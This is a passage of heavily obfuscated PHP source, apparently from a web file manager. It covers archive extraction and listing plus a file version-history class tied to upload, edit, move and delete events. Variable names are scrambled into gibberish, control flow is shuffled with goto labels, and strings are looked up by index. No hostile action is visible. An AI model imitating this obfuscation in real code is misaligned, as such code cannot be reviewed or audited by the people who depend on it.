"\162\145\x70\x6c\141\x63\145") { goto FÑØÒ÷©ÑÈ; Dèš–‰ øˆ: return !0; goto dåØ¼Ş²Å¯; EÙÔãªâ’…: if (!@file_exists(self::iconvSystem($A’î¦‚Á­ˆ))) { $D¸¯å½·®± = self::localFilePath($fÏššÕÆ¤¤, $D©Ü± ¹ù); $A’î¦‚Á­ˆ = $D¸¯å½·®± ? $D¸¯å½·®± : parent::download($fÏššÕÆ¤¤, $A’î¦‚Á­ˆ); } $A’î¦‚Á­ˆ = self::iconvSystem($A’î¦‚Á­ˆ); $D§™ƒ…õõõ = isset($f½„¤¥š¿Ş[$A®Ì¬·Š‰[1072]]) ? $f½„¤¥š¿Ş[$A®Ì¬·Š‰[1072]] : $A®Ì¬·Š‰[1073]; goto C±Š‡›¦—‰; b‰Ç½¤¦ ±: mk_dir($BÙ£ê ƒİò); $D©Ü± ¹ù = self::fileExt($d¦ƒŒ¦¢¾­); $A’î¦‚Á­ˆ = $BÙ£ê ƒİò . $A®Ì¬·Š‰[95] . $D©Ü± ¹ù; goto EÙÔãªâ’…; céŞçÉùÇ¬: foreach ($fŒ…ß–‹‘ as $F«á¸˜¶‘à) { $F«á¸˜¶‘à = self::iconvApp($F«á¸˜¶‘à); self::move($F«á¸˜¶‘à, $E“à¡Ì Ë, $BÃë±è¸óÈ); } del_dir($BÙ£ê ƒİò); if (!$D¸¯å½·®±) { del_file($A’î¦‚Á­ˆ); } goto Dèš–‰ øˆ; cÁ”¿´¡í: Hook::trigger($A®Ì¬·Š‰[1077], $BÙ£ê ƒİò); recursion_dir($BÙ£ê ƒİò, $DğØ™£•¤†, $bî½Â­Ã¿, 0); $fŒ…ß–‹‘ = array_merge($DğØ™£•¤†, $bî½Â­Ã¿); goto céŞçÉùÇ¬; FİŞ»®ÂË¸: $dæ´ìˆÁ©Í = self::tmpFileName($d¦ƒŒ¦¢¾­); $BÙ£ê ƒİò = TEMP_FILES . $dæ´ìˆÁ©Í; del_dir($BÙ£ê ƒİò); goto b‰Ç½¤¦ ±; cù•Ù“É: if (!($d¦ƒŒ¦¢¾­ = parent::info($fÏššÕÆ¤¤))) { show_json(LNG($A®Ì¬·Š‰[1071]), !1); } if (!($fœ‘öíÂÑ” = parent::infoFull($E“à¡Ì Ë))) { $E“à¡Ì Ë = parent::mkdir($E“à¡Ì Ë); $fœ‘öíÂÑ” = array($A®Ì¬·Š‰[76] => $E“à¡Ì Ë); } else { if (isset($fœ‘öíÂÑ”[$A®Ì¬·Š‰[403]]) && trim($fœ‘öíÂÑ”[$A®Ì¬·Š‰[76]], $A®Ì¬·Š‰[8]) != trim($E“à¡Ì Ë, $A®Ì¬·Š‰[8])) { $d´é¿Ï–Šï = KodIO::make($fœ‘öíÂÑ”[$A®Ì¬·Š‰[485]]); $dËà°©·µ = parent::fileNameAuto($d´é¿Ï–Šï, $fœ‘öíÂÑ”[$A®Ì¬·Š‰[28]], REPEAT_RENAME_FOLDER, !0); $E“à¡Ì Ë = parent::mkdir($d´é¿Ï–Šï . $dËà°©·µ); $fœ‘öíÂÑ” = array($A®Ì¬·Š‰[76] => $E“à¡Ì Ë); } } $E“à¡Ì Ë = $fœ‘öíÂÑ”[$A®Ì¬·Š‰[76]]; goto FİŞ»®ÂË¸; FÑØÒ÷©ÑÈ: $A®Ì¬·Š‰ =& $_SERVER[Šº]; $fÏššÕÆ¤¤ = $f½„¤¥š¿Ş[$A®Ì¬·Š‰[76]]; $E“à¡Ì Ë = $f½„¤¥š¿Ş[$A®Ì¬·Š‰[1070]]; goto cù•Ù“É; C±Š‡›¦—‰: $bôåõ‡Îø = KodArchive::extract($A’î¦‚Á­ˆ, $BÙ£ê ƒİò . $A®Ì¬·Š‰[8], $D§™ƒ…õõõ); self::archiveExt(); if (!$bôåõ‡Îø[$A®Ì¬·Š‰[1074]]) { show_json($A®Ì¬·Š‰[1075] . $bôåõ‡Îø[$A®Ì¬·Š‰[1076]], !1); } goto cÁ”¿´¡í; dåØ¼Ş²Å¯: } public static function unzipList($F­Û‡àŠ¹…) { goto F†»‰»µ„; dãß‰‡°Ïö: self::archiveExt(); del_dir($d££¬Ğäª¡); if (!$FÙ²×‘ÛŠ†[$fäöª§àøõ[1074]]) { show_json($FÙ²×‘ÛŠ†[$fäöª§àøõ[1076]], !1); } goto Aá•ˆ›³ÛÇ; Aá•ˆ›³ÛÇ: $D¯¨Ú×İ© = json_encode($FÙ²×‘ÛŠ†[$fäöª§àøõ[1076]]); self::setContent($C£°³¦‰è‹, $D¯¨Ú×İ©); if (count($FÙ²×‘ÛŠ†[$fäöª§àøõ[1076]]) >= $c¹¥äŸ†ğ) { show_json(sprintf(LNG($fäöª§àøõ[1080]), count($FÙ²×‘ÛŠ†[$fäöª§àøõ[1076]])), !1); } goto D™Ë•Ş…; D™Ë•Ş…: return $FÙ²×‘ÛŠ†[$fäöª§àøõ[1076]]; goto bñë§ì Ï“; F†»‰»µ„: $fäöª§àøõ =& $_SERVER[Šº]; $c¬ØìçÇÎ = $F­Û‡àŠ¹…[$fäöª§àøõ[76]]; $E–¥æ¹Ô×î = isset($F­Û‡àŠ¹…[$fäöª§àøõ[1078]]) ? $F­Û‡àŠ¹…[$fäöª§àøõ[1078]] : -1; goto A×Š˜±Ó†; C‚âè„ÏÌ¨: $F¾¶¿à¨ë¥ = self::info($D§‘×’Òï); $E¼éæ›“¼ = self::fileExt($F¾¶¿à¨ë¥); $aªùë‹‡É = self::tmpFileName($F¾¶¿à¨ë¥); goto D ¢ëù‰êø; A×Š˜±Ó†: $c¹¥äŸ†ğ = 50000; if (request_url_safe($c¬ØìçÇÎ)) { $Aš‡§º»ß˜ = parse_url_query($c¬ØìçÇÎ); if (!isset($Aš‡§º»ß˜[$fäöª§àøõ[76]])) { show_json($fäöª§àøõ[1079], !1); } } $D§‘×’Òï = isset($Aš‡§º»ß˜) ? $Aš‡§º»ß˜[$fäöª§àøõ[76]] : $c¬ØìçÇÎ; goto C‚âè„ÏÌ¨; a„íÊæ»‰²: $cˆËİ÷° = self::iconvSystem($cˆËİ÷°); if ($E–¥æ¹Ô×î >= 0) { $DÏ…ºœêÕ = isset($F­Û‡àŠ¹…[$fäöª§àøõ[1082]]) ? $F­Û‡àŠ¹…[$fäöª§àøõ[1082]] : !1; $c­–ÍÍà¨… = isset($F­Û‡àŠ¹…[$fäöª§àøõ[28]]) ? $F­Û‡àŠ¹…[$fäöª§àøõ[28]] : $fäöª§àøõ[33]; KodArchive::filePreview($cˆËİ÷°, $E–¥æ¹Ô×î, $DÏ…ºœêÕ, $c­–ÍÍà¨…); self::archiveExt(); die; } $FÙ²×‘ÛŠ† = KodArchive::listContent($cˆËİ÷°); goto dãß‰‡°Ïö; D ¢ëù‰êø: if (isset($Aš‡§º»ß˜)) { $e ç³ÍğãŸ = array($Aš‡§º»ß˜[$fäöª§àøõ[76]], $Aš‡§º»ß˜[$fäöª§àøõ[1078]], $Aš‡§º»ß˜[$fäöª§àøõ[28]]); $Dñ†èƒ”—Ş = md5(implode($fäöª§àøõ[71], $e ç³ÍğãŸ)) . $fäöª§àøõ[95] . get_path_ext($Aš‡§º»ß˜[$fäöª§àøõ[28]]); } else { $e ç³ÍğãŸ = array($F¾¶¿à¨ë¥[$fäöª§àøõ[28]], $F¾¶¿à¨ë¥[$fäöª§àøõ[76]], $F¾¶¿à¨ë¥[$fäöª§àøõ[78]]); $Dñ†èƒ”—Ş = md5(implode($fäöª§àøõ[71], $e ç³ÍğãŸ)) . $fäöª§àøõ[95] . $E¼éæ›“¼; } if ($E–¥æ¹Ô×î == -1) { $C£°³¦‰è‹ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\151\x65\x77\x2f{$aªùë‹‡É}\57{$Dñ†èƒ”—Ş}\x2e\x6c\157\147"; $eªî´ËµÜ¿ = self::infoFull($C£°³¦‰è‹); if ($eªî´ËµÜ¿) { $C£°³¦‰è‹ = $eªî´ËµÜ¿[$fäöª§àøõ[76]]; $C¯õÛÀˆªø = self::getContent($C£°³¦‰è‹); if ($C¯õÛÀˆªø) { $D¯¨Ú×İ© = json_decode($C¯õÛÀˆªø, !0); if (count($D¯¨Ú×İ©) >= $c¹¥äŸ†ğ) { show_json(sprintf(LNG($fäöª§àøõ[1080]), count($D¯¨Ú×İ©)), !1); } return $D¯¨Ú×İ©; } } else { $C£°³¦‰è‹ = self::mkfile($C£°³¦‰è‹); } } $d££¬Ğäª¡ = TEMP_FILES . $aªùë‹‡É; goto BëŒ­¶‹›; BëŒ­¶‹›: if (!is_dir($d££¬Ğäª¡)) { mk_dir($d££¬Ğäª¡); } $cˆËİ÷° = $d££¬Ğäª¡ . $fäöª§àøõ[8] . $Dñ†èƒ”—Ş; if (!@file_exists(self::iconvSystem($cˆËİ÷°))) { if (isset($Aš‡§º»ß˜)) { url_request($c¬ØìçÇÎ, $fäöª§àøõ[1081], $cˆËİ÷°); } else { $aÛÕááæ„¼ = self::localFilePath($c¬ØìçÇÎ, $E¼éæ›“¼); $cˆËİ÷° = $aÛÕááæ„¼ ? $aÛÕááæ„¼ : self::download($c¬ØìçÇÎ, $cˆËİ÷°); } } goto a„íÊæ»‰²; bñë§ì Ï“: } private static function fileExt($dò³¦îËª³) { $BŸßŞäÅÜ =& $_SERVER[Šº]; $c—Õ¸µªó˜ = $dò³¦îËª³[$BŸßŞäÅÜ[168]]; if ($c—Õ¸µªó˜ == $BŸßŞäÅÜ[1083]) { $FÔŸã˜Š¦Â = $BŸßŞäÅÜ[1084]; if (substr($dò³¦îËª³[$BŸßŞäÅÜ[28]], -strlen($FÔŸã˜Š¦Â)) == $FÔŸã˜Š¦Â) { $c—Õ¸µªó˜ = $BŸßŞäÅÜ[1085]; } } self::archiveExt($c—Õ¸µªó˜); return $c—Õ¸µªó˜; } private static function zipFileList($AèÑ·ñêÜ, $bóÍÅõ¢¼ = false) { $Aó‘²º–çÕ =& $_SERVER[Šº]; $aÆŒ £‘Ú¯ = array(); foreach ($AèÑ·ñêÜ as $C­¶ÆÙ‰Ÿ‹) { $CÍÏŒ¦‰Ì = $C­¶ÆÙ‰Ÿ‹[$Aó‘²º–çÕ[76]]; if ($bóÍÅõ¢¼) { $CÍÏŒ¦‰Ì = self::copy($C­¶ÆÙ‰Ÿ‹[$Aó‘²º–çÕ[76]], $bóÍÅõ¢¼, $Aó‘²º–çÕ[781]); } else { $Dƒ‘Óã¢ = self::init($C­¶ÆÙ‰Ÿ‹[$Aó‘²º–çÕ[76]]); if ($Dƒ‘Óã¢->getType() == $Aó‘²º–çÕ[106]) { $CÍÏŒ¦‰Ì = $Dƒ‘Óã¢->path; } } if ($CÍÏŒ¦‰Ì && self::local()->exist($CÍÏŒ¦‰Ì)) { $aÆŒ £‘Ú¯[$C­¶ÆÙ‰Ÿ‹[$Aó‘²º–çÕ[76]]] = $CÍÏŒ¦‰Ì; } } if (!empty($aÆŒ £‘Ú¯)) { return array_values($aÆŒ £‘Ú¯); } show_json(LNG($Aó‘²º–çÕ[1049]), !1); } public static function tmpFileName($fè¯š¼ÉÌÉ) { $B÷ƒ£“ËõØ =& $_SERVER[Šº]; $DÆæ¾¬­¸ = array($fè¯š¼ÉÌÉ[$B÷ƒ£“ËõØ[28]], $fè¯š¼ÉÌÉ[$B÷ƒ£“ËõØ[76]], $fè¯š¼ÉÌÉ[$B÷ƒ£“ËõØ[78]], $fè¯š¼ÉÌÉ[$B÷ƒ£“ËõØ[494]]); return md5(implode($B÷ƒ£“ËõØ[71], $DÆæ¾¬­¸)); } private static function localFilePath($A‡š±à«†, $BÁ  ›«œË) { goto e‰‰¾ÎÔà; A ¹ÈÍ‹…: if ($cáÅŸì‚Ğ[$fœ¾œ–À™â[29]] == KodIO::KOD_SOURCE) { $e•«óõî = Model($fœ¾œ–À™â[788])->fileInfoGet(KodIO::sourceID($A‡š±à«†)); if (!$e•«óõî[$fœ¾œ–À™â[76]]) { show_json($fœ¾œ–À™â[1088], !1); } $A‡š±à«† = $e•«óõî[$fœ¾œ–À™â[76]]; } $F“®¹Š‘ƒ¯ = self::init($A‡š±à«†); $EÖë˜«²Æ— = $F“®¹Š‘ƒ¯->getType(); goto aİÏ×Ø–â¢; e‰‰¾ÎÔà: $fœ¾œ–À™â =& $_SERVER[Šº]; if ($BÁ  ›«œË == $fœ¾œ–À™â[1086] && strtoupper(substr(PHP_OS, 0, 3)) == $fœ¾œ–À™â[1087]) { return !1; } $cáÅŸì‚Ğ = KodIO::parse($A‡š±à«†); goto A ¹ÈÍ‹…; aİÏ×Ø–â¢: if ($EÖë˜«²Æ— == $fœ¾œ–À™â[106] || $EÖë˜«²Æ— == $fœ¾œ–À™â[1089]) { if (!$F“®¹Š‘ƒ¯->exist($F“®¹Š‘ƒ¯->path)) { show_json(LNG($fœ¾œ–À™â[105]), !1); } return $F“®¹Š‘ƒ¯->path; } return !1; goto A—ÛŸ’Ú‘Ù; A—ÛŸ’Ú‘Ù: } private static function archiveExt($DÜöÔ‚½Š = '') { $GLOBALS[$_SERVER[Šº][1090]] = $DÜöÔ‚½Š; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto DÄ©®¦‡èª; FêËîµ‰ùí: Hook::bind($F‘æíÄ•[1102], $F‘æíÄ•[1103]); Hook::bind($F‘æíÄ•[1104], $F‘æíÄ•[1105]); goto D†ğ°‘±Üİ; c‘¡¥²ğÊ‘: if ($bÂÎÎ‹¤–‡[$F‘æíÄ•[1092]] <= 0) { return; } if (isset($_REQUEST[$F‘æíÄ•[1093]]) && $_REQUEST[$F‘æíÄ•[1093]] == $F‘æíÄ•[87]) { return; } Hook::bind($F‘æíÄ•[1094], $F‘æíÄ•[1095]); goto d÷“ğ¹ì®å; DÄ©®¦‡èª: $F‘æíÄ• =& $_SERVER[Šº]; $bÂÎÎ‹¤–‡ = $GLOBALS[$F‘æíÄ•[6]][$F‘æíÄ•[88]]; if ($bÂÎÎ‹¤–‡[$F‘æíÄ•[1091]] != 1) { return; } goto c‘¡¥²ğÊ‘; d÷“ğ¹ì®å: Hook::bind($F‘æíÄ•[1096], $F‘æíÄ•[1097]); Hook::bind($F‘æíÄ•[1098], $F‘æíÄ•[1099]); Hook::bind($F‘æíÄ•[1100], $F‘æíÄ•[1101]); goto FêËîµ‰ùí; D†ğ°‘±Üİ: } public static function eventBeforeUpload($D®†µÚšÚŞ) { if ($D®†µÚšÚŞ[3] && $D®†µÚšÚŞ[3] != REPEAT_REPLACE) { return; } $fÙêÙ§Ñ² = self::parsePath($D®†µÚšÚŞ[0]); if (!$fÙêÙ§Ñ²) { return; } self::add($fÙêÙ§Ñ²); } public static function eventBeforeEdit($b„³ŒåŸĞë) { $CÄö–“Ğô– = self::parsePath($b„³ŒåŸĞë[0]); if (!$CÄö–“Ğô–) { return; } self::add($CÄö–“Ğô–); } public static function eventBeforeCopyFile($eÔ¶„Õí, $BÀòºÙ×, $fæ«Š„î¼‘, $bÂØŠƒãŠ, $CÂ›èî»¨, $AËãÁÑÙ) { $bÒØƒÉİ«Œ = $fæ«Š„î¼‘->getPathOuter($bÂØŠƒãŠ); $Aäƒ—¼ôÔ = self::parsePath($bÒØƒÉİ«Œ); if (!$Aäƒ—¼ôÔ) { return; } self::add($Aäƒ—¼ôÔ); } public static function eventBeforeRename($e¬±Ã¬²) { $fğ—ÙŒŞğš =& $_SERVER[Šº]; $DíŒö‹ùÙ  = self::parsePath($e¬±Ã¬²[0]); if (!$DíŒö‹ùÙ ) { return; } $Aƒ³¼ôİ­· = self::checkInHistory($DíŒö‹ùÙ ); if (!$Aƒ³¼ôİ­·) { return; } if ($Aƒ³¼ôİ­·[$fğ—ÙŒŞğš[29]] == $fğ—ÙŒŞğš[192]) { $E“ÛŞ™ÙÕ = self::listData($DíŒö‹ùÙ ); if ($E“ÛŞ™ÙÕ && $E“ÛŞ™ÙÕ[$fğ—ÙŒŞğš[366]]) { self::moveHistory($DíŒö‹ùÙ , $e¬±Ã¬²[1]); } } else { IO::rename($Aƒ³¼ôİ­·[$fğ—ÙŒŞğš[76]], $e¬±Ã¬²[1]); } } public static function eventBeforeMove($cÉ«Ş¢í) { goto B—¦ŒŒ…¹ì; FÁª‡™ê‡: $A‡œì¬¯¤ = self::checkInHistory($eÂ˜óš‰âù); if (!$A‡œì¬¯¤) { return; } $A±óÛÆ×Ø = self::pathHistory($cÇØ½à¾“); goto Cì¸ïå‰±’; BÔŒèŸÁÑ: $cÇØ½à¾“ = self::parsePath($cÉ«Ş¢í[1]); if (!$cÇØ½à¾“) { return; } $E²˜ôê¿ˆ = $cÉ«Ş¢í[3]; goto FÁª‡™ê‡; B—¦ŒŒ…¹ì: $a›œ‡áØƒ =& $_SERVER[Šº]; $eÂ˜óš‰âù = self::parsePath($cÉ«Ş¢í[0]); if (!$eÂ˜óš‰âù) { return; } goto BÔŒèŸÁÑ; Cì¸ïå‰±’: if ($A‡œì¬¯¤[$a›œ‡áØƒ[29]] == $a›œ‡áØƒ[192]) { $fœ‡ƒ»¨­… = self::listData($eÂ˜óš‰âù); $EÕ©¦‰å…º = rtrim($cÇØ½à¾“, $a›œ‡áØƒ[8]) . $a›œ‡áØƒ[8] . ($E²˜ôê¿ˆ ? $E²˜ôê¿ˆ : get_path_this($eÂ˜óš‰âù)); $AàÒ™ñ¯îƒ = self::listData($EÕ©¦‰å…º); if ($fœ‡ƒ»¨­… && $fœ‡ƒ»¨­…[$a›œ‡áØƒ[366]] && $AàÒ™ñ¯îƒ && $AàÒ™ñ¯îƒ[$a›œ‡áØƒ[366]]) { return self::clear($eÂ˜óš‰âù); } if ($fœ‡ƒ»¨­… && $fœ‡ƒ»¨­…[$a›œ‡áØƒ[366]]) { self::moveHistory($eÂ˜óš‰âù, $E²˜ôê¿ˆ, $A±óÛÆ×Ø); } } else { IO::move($A‡œì¬¯¤[$a›œ‡áØƒ[76]], $A±óÛÆ×Ø, !1, $E²˜ôê¿ˆ); self::clearEmptyFolder(IO::pathFather($A‡œì¬¯¤[$a›œ‡áØƒ[76]])); } goto aÌøÑ³ã‰Î; aÌøÑ³ã‰Î: } public static function eventAfterRemove($fÙ˜¶ò¤æ, $A§ã—íƒç) { goto B«ˆ¼ñ´ ê; Fî…®áÙì: if ($AÃÆšÀĞé[$b³²ãã ¨À[29]] == $b³²ãã ¨À[192]) { $Dµì‡ªà·‰ = self::listData($f‹’½‚ãÍ, !1); if ($Dµì‡ªà·‰ && $Dµì‡ªà·‰[$b³²ãã ¨À[366]]) { self::clear($f‹’½‚ãÍ, !1); } } else { IO::remove($AÃÆšÀĞé[$b³²ãã ¨À[76]]); self::clearEmptyFolder(IO::pathFather($AÃÆšÀĞé[$b³²ãã ¨À[76]])); } goto Bº¥ŞëÑ; F¿ëÅ‡†‘ù: if (!$f‹’½‚ãÍ) { return; } $AÃÆšÀĞé = self::checkInHistory($f‹’½‚ãÍ); if (!$AÃÆšÀĞé) { return; } goto Fî…®áÙì; B«ˆ¼ñ´ ê: $b³²ãã ¨À =& $_SERVER[Šº]; if (!$A§ã—íƒç) { return; } $f‹’½‚ãÍ = self::parsePath($fÙ˜¶ò¤æ[0]); goto F¿ëÅ‡†‘ù; Bº¥ŞëÑ: } private static function checkInHistory($b–ì†”½‰) { $açÒÒäµë = self::pathHistory($b–ì†”½‰); if (!IO::exist($açÒÒäµë)) { $açÒÒäµë .= $_SERVER[Šº][1106]; } return IO::exist($açÒÒäµë) ? IO::info($açÒÒäµë) : !1; } private static function parsePath($d÷ö¯”¿µ) { goto CˆÃ¶ÓŒæØ; CˆÃ¶ÓŒæØ: $aâŒíÇöº =& $_SERVER[Šº]; if (!$d÷ö¯”¿µ) { return !1; } if ($GLOBALS[$aâŒíÇöº[1107]]) { return; } goto A‡¿ì³ª³²; CŒùï‰Áš: $FÄÒãÀèÂ· = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $aâŒíÇöº[1109]); foreach ($FÄÒãÀèÂ· as $B©‚äöõ§Ô) { if (!$B˜ö¼‰­ÓÅ && substr($d÷ö¯”¿µ, 0, strlen($B©‚äöõ§Ô)) == $B©‚äöõ§Ô) { return !1; } } self::log($GLOBALS[$aâŒíÇöº[1031]] . $aâŒíÇöº[1110] . $d÷ö¯”¿µ); goto DÇÒ•»ù´Â; A‡¿ì³ª³²: $f‚ÓíğŠÛ = KodIO::parse($d÷ö¯”¿µ); $B˜ö¼‰­ÓÅ = $f‚ÓíğŠÛ[$aâŒíÇöº[29]]; $CÎà…ªÑÕ = !$B˜ö¼‰­ÓÅ || $B˜ö¼‰­ÓÅ == KodIO::KOD_IO || $B˜ö¼‰­ÓÅ == KodIO::KOD_SHARE_ITEM; goto F¹—Ğº‘Üâ; F¹—Ğº‘Üâ: if (!$CÎà…ªÑÕ || !$f‚ÓíğŠÛ[$aâŒíÇöº[1108]]) { return !1; } if ($B˜ö¼‰­ÓÅ == KodIO::KOD_SHARE_ITEM) { $Bä®Ö†…â‡ = IO::init($d÷ö¯”¿µ); if ($Bä®Ö†…â‡->pathParse[$aâŒíÇöº[1036]]) { return self::parsePath($Bä®Ö†…â‡->pathParse[$aâŒíÇöº[1036]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto CŒùï‰Áš; DÇÒ•»ù´Â: return $d÷ö¯”¿µ; goto Fä§ÛçÀŒô; Fä§ÛçÀŒô: } private static function pathHistory($A½ˆÍÉåë) { $cˆ—Á¥Èº¹ =& $_SERVER[Šº]; $cè™ÀÌÍ”ç = self::$_historyBase . ltrim(KodIO::clear($A½ˆÍÉåë), $cˆ—Á¥Èº¹[8]); $cè™ÀÌÍ”ç = str_replace(array($cˆ—Á¥Èº¹[1111]), array($cˆ—Á¥Èº¹[1112]), $cè™ÀÌÍ”ç); return $cè™ÀÌÍ”ç; } public static function log($B—İóğª’‚) { } public static function historyCount($A¥«™ĞŠœà) { $Bİ‚‰˜Áœõ =& $_SERVER[Šº]; $D»ØÇ­œˆ© = array(); $AãØ”á—„Å = array(); foreach ($A¥«™ĞŠœà as $CÆõéÎ¢ ) { $cö©‰àØ‡¥ = get_path_father($CÆõéÎ¢ ); if (!$AãØ”á—„Å[$cö©‰àØ‡¥]) { $AãØ”á—„Å[$cö©‰àØ‡¥] = array(); } $AãØ”á—„Å[$cö©‰àØ‡¥][] = get_path_this($CÆõéÎ¢ ); } foreach ($AãØ”á—„Å as $cö©‰àØ‡¥ => $fíéÉ»·) { $A±ÁççğÃ = self::parsePath($cö©‰àØ‡¥); if (!$A±ÁççğÃ) { continue; } foreach ($fíéÉ»· as $BË†®âï÷é) { $cõîÙÉÕØ´ = self::listData(rtrim($A±ÁççğÃ, $Bİ‚‰˜Áœõ[8]) . $Bİ‚‰˜Áœõ[8] . $BË†®âï÷é, !1); if ($cõîÙÉÕØ´ && $cõîÙÉÕØ´[$Bİ‚‰˜Áœõ[366]]) { $D»ØÇ­œˆ©[rtrim($cö©‰àØ‡¥, $Bİ‚‰˜Áœõ[8]) . $Bİ‚‰˜Áœõ[8] . $BË†®âï÷é] = count($cõîÙÉÕØ´[$Bİ‚‰˜Áœõ[366]]); } } } return $D»ØÇ­œˆ©; } public static function add($c¸²ÏÔö) { goto EŠòà¾»ê†; Câî‡¼¤Ü: $Bœ¤©à°Äå = Model($c³«—ù†§á[728])->get($c³«—ù†§á[1113]); $CØã¢œˆìï = $GLOBALS[$c³«—ù†§á[6]][$c³«—ù†§á[88]][$c³«—ù†§á[1092]]; $C é‰åŠ = $Bœ¤©à°Äå == $c³«—ù†§á[1114] ? 5 : $CØã¢œˆìï; goto AËô‚œÈ¹ê; CäÙêÚ¦: $E…Š•£ì¾ñ = $Då¥¥å“Ä•[$c³«—ù†§á[366]]; if ($d¯•ŠÈ[$c³«—ù†§á[78]] == 0) { return; } if ($d¯•ŠÈ[$c³«—ù†§á[78]] >= 1024 * 1024 * 500) { return !1; } goto c÷éĞì×Šó; Eõ¸Æ¥ìœ³: return self::saveData($Då¥¥å“Ä•[$c³«—ù†§á[1118]], $E…Š•£ì¾ñ); goto bŸ¼åùÛà÷; AËô‚œÈ¹ê: if ($CØã¢œˆìï <= 0) { return; } $A®¤ÄÔˆ‰£ = IO::hashSimple($c¸²ÏÔö); $d¯•ŠÈ = IO::info($c¸²ÏÔö); goto CäÙêÚ¦; EŠòà¾»ê†: $c³«—ù†§á =& $_SERVER[Šº]; $Då¥¥å“Ä• = self::listData($c¸²ÏÔö); if (!$Då¥¥å“Ä•) { return; } goto Câî‡¼¤Ü; c÷éĞì×Šó: if ($E…Š•£ì¾ñ && $E…Š•£ì¾ñ[0][$c³«—ù†§á[171]] == $A®¤ÄÔˆ‰£) { return !0; } if (array_key_exists($c³«—ù†§á[195], $d¯•ŠÈ) && !$d¯•ŠÈ[$c³«—ù†§á[195]]) { return !1; } $Bï‘„›ËŞĞ = short_id(time()); goto CßÇì‘­¥È; FŠ¼‚ÙÅ×: if (!$e†¯í¿è’Õ) { self::clearEmptyFolder($Då¥¥å“Ä•[$c³«—ù†§á[1117]]); return !1; } array_unshift($E…Š•£ì¾ñ, $b©ªñÍ‰†Ë); if (count($E…Š•£ì¾ñ) > $C é‰åŠ) { $B”‡ÓÂ¬¬Ø = array_slice($E…Š•£ì¾ñ, $C é‰åŠ); foreach ($B”‡ÓÂ¬¬Ø as $e¸×ºŒ Ñ½) { IO::remove($Då¥¥å“Ä•[$c³«—ù†§á[1117]] . $e¸×ºŒ Ñ½[$c³«—ù†§á[28]]); } $E…Š•£ì¾ñ = array_slice($E…Š•£ì¾ñ, 0, $C é‰åŠ); } goto Eõ¸Æ¥ìœ³; CßÇì‘­¥È: $b©ªñÍ‰†Ë = array($c³«—ù†§á[392] => $Bï‘„›ËŞĞ, $c³«—ù†§á[171] => $A®¤ÄÔˆ‰£, $c³«—ù†§á[28] => $d¯•ŠÈ[$c³«—ù†§á[28]] . $c³«—ù†§á[95] . date($c³«—ù†§á[1115]) . rand_string(1), $c³«—ù†§á[78] => $d¯•ŠÈ[$c³«—ù†§á[78]], $c³«—ù†§á[439] => USER_ID, $c³«—ù†§á[193] => time(), $c³«—ù†§á[1116] => $c³«—ù†§á[33]); IO::mkdir($Då¥¥å“Ä•[$c³«—ù†§á[1117]]); $e†¯í¿è’Õ = IO::copy($c¸²ÏÔö, $Då¥¥å“Ä•[$c³«—ù†§á[1117]], !1, $b©ªñÍ‰†Ë[$c³«—ù†§á[28]]); goto FŠ¼‚ÙÅ×; bŸ¼åùÛà÷: } public static function remove($c™Ô¦×ç‚®, $DÈğÔ‡É…Û) { $c˜²ÓÖ‡å’ =& $_SERVER[Šº]; $CŸß²œßîä = self::listData($c™Ô¦×ç‚®); $a´ÓŞŠ“Áˆ = array(); if (!$CŸß²œßîä) { return !1; } foreach ($CŸß²œßîä[$c˜²ÓÖ‡å’[366]] as $AÆĞ Ü«•¥) { if ($AÆĞ Ü«•¥[$c˜²ÓÖ‡å’[392]] == $DÈğÔ‡É…Û) { IO::remove($CŸß²œßîä[$c˜²ÓÖ‡å’[1117]] . $AÆĞ Ü«•¥[$c˜²ÓÖ‡å’[28]]); continue; } $a´ÓŞŠ“Áˆ[] = $AÆĞ Ü«•¥; } return self::saveData($CŸß²œßîä[$c˜²ÓÖ‡å’[1118]], $a´ÓŞŠ“Áˆ); } public static function clear($c‘Ü„ÆâÓ—, $f¡õÃƒÔ¼ = true) { $AÜÆâì«Î² =& $_SERVER[Šº]; $D…–„ŒßŠæ = self::listData($c‘Ü„ÆâÓ—, $f¡õÃƒÔ¼); if (!$D…–„ŒßŠæ) { return !1; } foreach ($D…–„ŒßŠæ[$AÜÆâì«Î²[366]] as $AŞØäìî§±) { IO::remove($D…–„ŒßŠæ[$AÜÆâì«Î²[1117]] . $AŞØäìî§±[$AÜÆâì«Î²[28]]); } return self::saveData($D…–„ŒßŠæ[$AÜÆâì«Î²[1118]], array()); } public static function moveHistory($cøÏĞ…ß†, $F„ˆ‚‘³º = '', $Aºçİ’—½ğ = '') { goto aÉÉÔô£ÔÖ; aÉÉÔô£ÔÖ: $fˆŒ²ÌÉÙ– =& $_SERVER[Šº]; $AŠØ ŸåÒ÷ = self::listData($cøÏĞ…ß†, !1); if (!$AŠØ ŸåÒ÷ || !$AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[366]]) { return !1; } goto BÇÁ¨ˆÁ˜³; a‹‚ÓÅ„ª: self::saveData($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1118]], $AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[366]]); self::clearEmptyFolder($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1117]]); goto Eëòß‡óíÄ; BãÁµë÷ñì: $f—æ˜œï™¨ = substr(get_path_this($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1118]]), 0, -strlen($B•Ä‰‡»Àå)); foreach ($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[366]] as $e¶ÁŞ‘Á¦’ => $aÕÎ„ò£ï) { $B‚ÁøäÓˆì = $F„ˆ‚‘³º . substr($aÕÎ„ò£ï[$fˆŒ²ÌÉÙ–[28]], strlen($f—æ˜œï™¨)); $aêÏ„çîÁ¾ = IO::move($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1117]] . $aÕÎ„ò£ï[$fˆŒ²ÌÉÙ–[28]], $Aºçİ’—½ğ, !1, $B‚ÁøäÓˆì); if ($aêÏ„çîÁ¾) { $AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[366]][$e¶ÁŞ‘Á¦’][$fˆŒ²ÌÉÙ–[28]] = $B‚ÁøäÓˆì; } } $AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1118]] = 